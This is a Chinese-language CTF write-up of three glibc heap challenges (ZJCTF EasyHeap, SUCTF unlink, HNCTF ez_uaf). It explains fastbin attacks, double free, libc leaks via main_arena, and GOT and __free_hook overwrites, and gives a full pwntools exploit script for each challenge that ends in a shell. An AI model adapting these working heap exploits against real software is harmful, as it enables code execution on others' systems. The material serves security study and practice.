# fastbin_attack例题

----

## 1.题目：

题目地址：[BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#[ZJCTF 2019]EasyHeap)

### 注意点：挟持got表

* 整体思路：利用编辑时edit_heap函数的堆溢出漏洞，覆盖heaparray中的堆指针指向free的got表，将其改为system的plt表，从而劫持**free函数的got表**，并且再向heaparray的另外一个指针指向的堆空间上写入字符串 **/bin/sh/x00** ，再free掉该堆空间，就能变向执行system("/bin/sh")

### 解题：

1. 题目中delete_heap函数在释放时将heaparray数组上的指针清0了，所以无法利用UAF：

   ![image-20240711213623590](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407112137396.png)

2. 但是在edit_heap函数中存在栈溢出漏洞，可以利用栈溢出覆盖fd伪造heap，再覆盖heaparray劫持free的got表(修改为system的plt表)：

   ![image-20240711213608268](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407112137384.png)

### 利用：

1. 在heaparray前面找一个空间来伪造堆（后续要利用它覆盖掉heaparray数组里面的指针），这个伪造的堆上size值要与实际分配的大小(包含chunk头大小)相同（与size相差0x11）：

   在0x00000000006020E0-0x33处刚好有一个空间中存储着0x7f，可以将地址0x6020ad作为伪造堆，那么0x7f就是size字段的值了（只要高4位相同就行了-->7）。

   ![image-20240711213549919](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407112137483.png)

   先申请三个堆，大小为0x68（实际分配的大小为0x7f），再释放掉heap2，利用heap2进行fastbin attack，实行任意地址申请堆（刚才找到的伪造堆）

   ```python
   add(0x68,b'6')#0 用于写free的got为system
   add(0x68,b'6')#1 用于存放binsh和覆盖2
   add(0x68,b'6')#2 用于构造fastbin attack，写heap0指针为free的got表
   free(2) #释放到fastbin，进行fastbin attack，具体方式是修改fd为heap指针附近的地址
   ```

   ![image-20240707172942666](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407112135771.png)

   编辑heap1.覆盖掉heap2的fd指针，并传参**"/bin/sh"** ，b'\x00'*0x60用来填充，p64(0x71)用来绕过size字段，p64(0x6020ad)就是修改的heap2的fd指针：

   ```python
   edit(1,b'/bin/sh\x00'+b'\x00'*0x60+p64(0x71)+p64(0x6020ad))
   #在heap1写binsh，0x6020ad是刚才定位到的fake heap
   ```

   ![image-20240711213507925](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407112138954.png)

   下面将heap2申请回来，再多申请一次就能得到我们前面伪造的堆0x6020ad，利用伪造的堆（heap3）进行堆溢出，覆盖掉heaparray上的heap0指针，指向free的got表：

   ```python
   add(0x68,b'6')#把2恢复回来
   add(0x68,b'6')#创建fake heap，实际上是heap指针数组前面0x33
   edit(3,b'\x00'*0x23+p64(elf.got['free']))   #覆盖heap0为free的got表0x602018
   ```

   覆盖前：

   ![image-20240711213451366](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407112134474.png)

   覆盖后，成功将heaparry[0]覆盖为free的got表：

   ![image-20240711213432953](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407112138624.png)

   后面直接编辑heap0，就能将free的got表上的值，修改为system的plt。之所以不直接覆盖为system的got表是因为函数调用的过程，如果之前**调用过一次**，那么后续会直接用**got表上的值**作为函数的确切地址，rip直接跳转到该处来执行指令，所以要先去到system的plt位置执行指令（第一次调用system函数），直接用got表逻辑上说不通因为got表的位置根本不是指令（会报错）：

   ![image-20240709152540670](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407112138535.png)

   ![image-20240711214035938](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407112140004.png)

   ```python
   edit(0,p64(elf.plt['system']))#此时heap0的指针已经被修改指向了free的got表0x602018，
   ```

   劫持free的got表之前：

   ![image-20240711213354664](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407112138475.png)

   劫持free的got表之之后：

   ![image-20240711213323347](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407112137952.png)

   后面只要free掉heap1即可调用system("/bin/sh")，因为heaparray[1]处的指针指向了 **"/bin/sh"** 字符串（前面覆盖的）：

   ```python
   free(1)#执行system（原来是free）,heap1指向的位置已经被写'/bin/sh'字符串
   ```

   成功劫持到free函数，来执行 **system("/bin/sh")** 。

   ![image-20240711214021973](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407112140045.png)

完整EXP：

```python
from pwn import *
context(os='linux', arch='amd64', log_level='debug')
#context(os='linux', arch='amd64')

# p = process('./pwn')
p = remote("node5.buuoj.cn",29165)
elf = ELF('./pwn')
# libc = ELF('./libc.so.6')

n2b = lambda x    : str(x).encode()
rv  = lambda x    : p.recv(x)
ru  = lambda s    : p.recvuntil(s)
sd  = lambda s    : p.send(s)
sl  = lambda s    : p.sendline(s)
sn  = lambda s    : sl(n2b(n))
sa  = lambda t, s : p.sendafter(t, s)
sla = lambda t, s : p.sendlineafter(t, s)
sna = lambda t, n : sla(t, n2b(n))
ia  = lambda      : p.interactive()
rop = lambda r    : flat([p64(x) for x in r])

if args.G:
    gdb.attach(p)

def add(size,content):
    sla(':','1')
    sla(':',str(size))
    sla(':',content)

def edit(idx, content):
    sla(':','2')
    sla(':',str(idx))
    sla(':',str(len(content)))
    sla(':',content)

def free(idx):
    sla(':','3')
    sla(':',str(idx))

add(0x68,b'6')#0 用于写free的got为system
add(0x68,b'6')#1 用于存放binsh和覆盖2
add(0x68,b'6')#2 用于构造fastbin attack，写heap0指针为free的got表
free(2)       #释放到fastbin，进行fastbin attack，具体方式是修改fd为heap指针附近的地址

edit(1,b'/bin/sh\x00'+b'\x00'*0x60+p64(0x71)+p64(0x6020ad))
#在heap1写binsh，0x6020ad是刚才定位到的fake heap

add(0x68,b'6')#把2恢复回来
add(0x68,b'6')#创建fake heap，实际上是heap指针数组前面0x33
edit(3,b'\x00'*0x23+p64(elf.got['free']))   #覆盖heap0为free的got表0x602018
edit(0,p64(elf.plt['system']))#此时heap0的指针已经被修改指向了free的got表0x602018，
# 直接往上面写数据协商system的plt表即可完成劫持，覆盖free的got为system的plt

free(1)#执行system（原来是free）,heap1指向的位置已经被写'/bin/sh'字符串
ia()

```

![image-20240711214005216](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407112140355.png)

## 2.题目：泄漏main_arena，再挟持got表

题目地址：[[SUCTF 2018 招新赛\]unlink | NSSCTF](https://www.nssctf.cn/problem/2334)

### 思路：

1. 由于没有UAF，所以构造double free让**两个指针指向同一个chunk**，进而利用unsortedbin来泄漏libc基地址。
2. 在heaplist前面**伪造chunk**，利用堆溢出覆盖heaplist实现**任意地址写**，进而覆盖free函数的got表指向system函数。

### 分析：

1. touch函数，size足够大，chunk不能超过11个：

   ![image-20240713143617347](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407131436412.png)

2. delete函数，heap指针清0，没有UAF漏洞：

   ![image-20240713143708871](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407131437933.png)

3. show函数，结合delete函数，所以不存在UAF漏洞：

   ![image-20240713143737663](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407131437714.png)

4. edit函数，存在堆溢出：

   ![](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407131438453.png)

### 利用：

1. 先构造double free，让两个指针指向同一个chunk0x90：

   ```python
   add(0x10)   #0 用来修改chunk1的fd指针
   add(0x10)   #1
   add(0x10)   #2 提供fd的高位地址
   add(0x10)   #3 用来修改chunk4的size字段
   add(0x80)   #4
   add(0x10)   #5 隔开top chunk
   
   #修改chunk1的fd指针，指向chunk4
   free(2)
   free(1)
   payload0 = p64(0)*3+p64(0x21)+p8(0x80)
   edit(0,payload0)
   
   payload3 = p64(0)*3+p64(0x21)   #修改chunk4的size，绕过申请时候的检查
   edit(3,payload3)
   add(0x10)   #1
   add(0x10)   #2 0x90chunk
   
   ##改回0x90chunk的大小
   payload3 = p64(0)*3+p64(0x91)
   edit(3,payload3)
   edit(2,"aaaa")	#验证两个指针
   edit(4,"bb")
   print(proc.pidof(p))
   pause()
   ```

   ![image-20240713144551391](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407131445552.png)

2. 释放chunk2和chunk4中的其中一个，让**0x90chunk进入unsortedbin**，再用**另一个输出**来泄漏main_arena中的地址：

   ```python
   free(2)
   show(4)
   p.recv()
   
   addr = u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b'\x00'))
   success("main_arena_unsortbin_addr==>"+hex(addr))
   main_arena_offset = libc.symbols["__malloc_hook"]+0x10
   success("main_arena_offset==>"+hex(main_arena_offset))
   libc_base = addr-(main_arena_offset+0x58)
   success("libc_addr==>"+hex(libc_base))
   
   system_addr = libc_base+libc.sym["system"]
   success("system_addr==>"+hex(system_addr))
   ```

   ![image-20240713144736739](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407131447851.png)

3. 再heaplist前面伪造一个chunk，用来覆盖heaplist中的指针，实现任意地址写，进而覆盖free函数的got表指向system函数的地址：

   ```python
   chunk_addr = 0x60209d
   add(0x68)   #4 
   free(4)		#修改其fd指针
   payload3 = p64(0)*3+p64(0x71)+p64(chunk_addr)
   edit(3,payload3)
   
   add(0x68)   #4
   add(0x68)   #6 申请得到伪造的chunk
   #溢出覆盖掉heaplist[0]中的指针
   payload6 = b"a"*19+p64(elf.got["free"])
   edit(6,payload6)
   
   #实现任意地址写，向free函数的got表中写入system函数地址
   payload0 = p64(system_addr)
   edit(0,payload0)
   ```

   ![image-20240713145227012](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407131453909.png)

   ![image-20240713145728402](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407131457813.png)

4. 最后写入 "/bin/sh"再free就能获得shell：

   ```python
   payload3 = b"/bin/sh\x00"
   edit(3,payload3)
   free(3)
   ```

5. 完整EXP：

   ```python
   from pwn import *
   from LibcSearcher import *
   # 设置系统架构, 打印调试信息
   # arch 可选 : i386 / amd64 / arm / mips
   context(os='linux', arch='amd64', log_level='debug')
   
   # p = remote("node4.anna.nssctf.cn",28074)
   p = process("./pwn")
   libc = ELF('./libc-2.23.so')
   elf = ELF("./pwn")
   
   
   def add(size):
       p.sendlineafter(b':','1')
       p.sendlineafter(b':',str(size))
       # p.sendlineafter(b':',content)
   
   def edit(index, content):
       p.sendlineafter(b':','4')
       p.sendlineafter(b':',str(index).encode())
       # p.sendlineafter(':',str(len(content)))
       p.sendafter(b'content',content)
   
   def show(index):
       p.sendlineafter(b':',b'3')
       p.sendlineafter(b'show',str(index).encode())
   
   def free(index):
       p.sendlineafter(b':','2')
       p.sendlineafter(b'delete',str(index).encode())
   
   add(0x10)   #0 用来修改chunk1的fd指针
   add(0x10)   #1
   add(0x10)   #2 提供fd的高位地址
   add(0x10)   #3 用来修改chunk4的size字段
   add(0x80)   #4
   add(0x10)   #5 隔开top chunk
   
   #修改chunk1的fd指针，指向chunk4
   free(2)
   free(1)
   payload0 = p64(0)*3+p64(0x21)+p8(0x80)
   edit(0,payload0)
   
   payload3 = p64(0)*3+p64(0x21)   #修改chunk4的size，绕过申请时候的检查
   edit(3,payload3)
   add(0x10)   #1
   add(0x10)   #2 0x90chunk
   
   ##改回0x90chunk的大小
   payload3 = p64(0)*3+p64(0x91)
   edit(3,payload3)
   edit(2,"aaaa")
   edit(4,"bb")
   
   free(2)
   show(4)
   p.recv()
   
   addr = u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b'\x00'))
   success("main_arena_unsortbin_addr==>"+hex(addr))
   main_arena_offset = libc.symbols["__malloc_hook"]+0x10
   success("main_arena_offset==>"+hex(main_arena_offset))
   libc_base = addr-(main_arena_offset+0x58)
   success("libc_addr==>"+hex(libc_base))
   
   system_addr = libc_base+libc.sym["system"]
   success("system_addr==>"+hex(system_addr))
   
   chunk_addr = 0x60209d
   add(0x68)   #4 
   free(4)		#修改其fd指针
   payload3 = p64(0)*3+p64(0x71)+p64(chunk_addr)
   edit(3,payload3)
   
   add(0x68)   #4
   add(0x68)   #6 申请得到伪造的chunk
   
   #溢出覆盖掉heaplist[0]中的指针
   payload6 = b"a"*19+p64(elf.got["free"])
   edit(6,payload6)
   
   #实现任意地址写，向free函数的got表中写入system函数地址
   payload0 = p64(system_addr)
   edit(0,payload0)
   
   payload3 = b"/bin/sh\x00"
   edit(3,payload3)
   free(3)
   p.sendline(b"find -name flag.txt")
   p.interactive()
   
   
   ```

   ![image-20240713150054834](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407131500909.png)



## 3.题目：

### 注意点: 覆盖 __free_hook

题目地址：[[HNCTF 2022 WEEK4\]ez_uaf | NSSCTF](https://www.nssctf.cn/problem/3105)

1. 利用**UAF漏洞** 和Fast chunk实现**任意地址写**，覆盖 **__free_hook** 为system从而拿到shell.

### 解题:

1. 先看add函数申请的chunk结构,建议直接gdb上看,大致结构,细节处再看代码:

   ![image-20240711205605996](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407112056084.png)

   ![image-20240711205644517](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407112056592.png)

2. delete函数中:

   ![image-20240711205814077](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407112058147.png)

3. show函数:

   ![image-20240711205929798](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407112059859.png)

4. edit函数:

   ![](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407112100650.png)

### 利用:

1. 先申请4个chunk:

   ```python
   add(0x10,b"a",b"a")   #0 利用UAF实现任意地址写,申请的大小与name大小要不同,否则后面可能申请不到heaplist指向的chunk
   add(0x10,b"b",b"b")   #1 功能同chunk0
   add(0x420,b'a',b'b')  #2 泄漏main_arena，进而泄漏libc基地址
   add(0x10,b"b",b"b")   #3 防止2释放后被收回top
   ```

2. 泄漏main_arena上的unserted地址,并计算出libc的基地址:

   ```python
   free(2)
   printf(2)
   addr = u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b'\x00'))
   success("main_arena_unsortbin_addr==>"+hex(addr))
   
   main_arena_offset = libc.symbols["__malloc_hook"]+0x10
   success("main_arena_offset==>"+hex(main_arena_offset))
   libc_base = addr-(main_arena_offset+0x60)
   success("libc_addr==>"+hex(libc_base))
   ```

   ![image-20240711210928204](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407112109521.png)

3. 释放掉chunk0和chunk1,再申请content一个大小为0x20的chunk:

   ```python
   free(0)
   free(1)
   
   system_addr = libc_base+libc.sym["system"]
   free_hook_addr = libc_base+libc.sym["__free_hook"]
   success("system_addr==>"+hex(system_addr))
   success("free_hook_addr==>"+hex(free_hook_addr))
   
   payload = b"/bin/sh\x00"+p64(0)+p64(free_hook_addr)+p64(0x0000000100000010)
   add(0x20,b"aaaa",payload)
   ```

   ![image-20240711212031691](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407112120879.png)

4. 使用chunk0,向free_hook_addr地址处(0x00007ffb8e1ed8e8)写入system地址,最后调用system("/bin/sh"):

   ```python
   payload = p64(system_addr)
   edit(0,payload)
   free(0)
   ```

   ![image-20240711212726385](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407112127527.png)

5. 完整EXP:

   ```python
   from pwn import *
   from LibcSearcher import *
   # 设置系统架构, 打印调试信息
   # arch 可选 : i386 / amd64 / arm / mips
   context(os='linux', arch='amd64', log_level='debug')
   
   # p = remote("node5.anna.nssctf.cn",20648)
   p = process("./pwn")
   libc = ELF('./libc-2.27.so')
   elf = ELF("./pwn")
   
   n2b = lambda x    : str(x).encode()
   rv  = lambda x    : p.recv(x)
   ru  = lambda s    : p.recvuntil(s)
   sd  = lambda s    : p.send(s)
   sl  = lambda s    : p.sendline(s)
   sn  = lambda s    : sl(n2b(n))
   sa  = lambda t, s : p.sendafter(t, s)
   sla = lambda t, s : p.sendlineafter(t, s)
   sna = lambda t, n : sla(t, n2b(n))
   ia  = lambda      : p.interactive()
   rop = lambda r    : flat([p64(x) for x in r])
   
   
   def add(size,name,content):
       sla(b':','1')
       sla(b':',str(size))
       sla(b':',name)
       sa(b':',content)
   
   def free(index):
       sla(b':','2')
       sla(b':',str(index).encode())
   
   def printf(index):
       p.sendlineafter(b':',b'3')
       p.sendlineafter(b':',str(index).encode())
   
   def edit(index, content):
       sla(b':','4')
       sla(b':',str(index).encode())
       p.sendline(content)
       # sla(b':',str(len(content)))
       # sa(b':',content)
   
   
   
   add(0x10,b"a",b"a")   #0 利用UAF实现任意地址写
   add(0x10,b"b",b"b")   #1 利用UAF实现任意地址写
   add(0x420,b'a',b'b')  #2 泄漏main_arena，进而泄漏libc基地址
   add(0x10,b"b",b"b")   #3 防止2释放后被收回top
   
   free(2)
   printf(2)
   
   addr = u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b'\x00'))
   success("main_arena_unsortbin_addr==>"+hex(addr))
   main_arena_offset = libc.symbols["__malloc_hook"]+0x10
   success("main_arena_offset==>"+hex(main_arena_offset))
   libc_base = addr-(main_arena_offset+0x60)
   success("libc_addr==>"+hex(libc_base))
   
   
   free(0)
   free(1)
   
   system_addr = libc_base+libc.sym["system"]
   free_hook_addr = libc_base+libc.sym["__free_hook"]
   
   success("system_addr==>"+hex(system_addr))
   success("free_hook_addr==>"+hex(free_hook_addr))
   
   payload = b"/bin/sh\x00"+p64(0)+p64(free_hook_addr)+p64(0x0000000100000010)
   add(0x20,b"aaaa",payload)
   
   payload = p64(system_addr)
   edit(0,payload)
   free(0)
   
   p.sendline(b"cat flag")
   p.interactive()
   
   ```

   

